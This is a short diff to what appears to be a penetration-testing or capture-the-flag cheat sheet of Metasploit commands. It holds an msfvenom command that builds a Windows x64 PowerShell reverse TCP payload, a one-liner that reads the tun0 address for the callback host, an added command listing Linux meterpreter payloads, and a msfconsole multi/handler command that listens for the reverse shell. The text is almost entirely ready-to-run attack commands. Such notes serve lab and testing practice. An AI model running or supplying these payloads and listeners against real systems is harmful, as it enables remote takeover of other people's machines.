@@ -8,5 +8,8 @@ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f ex
 
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
 
+# search payloads
+msfvenom --list payloads | grep linux | grep meterpreter | grep x64
+
 # listener handler
 msfconsole -q -x "use multi/handler; set payload <PAYLOAD>; set lhost <LHOST>; set lport <PORT>; exploit"
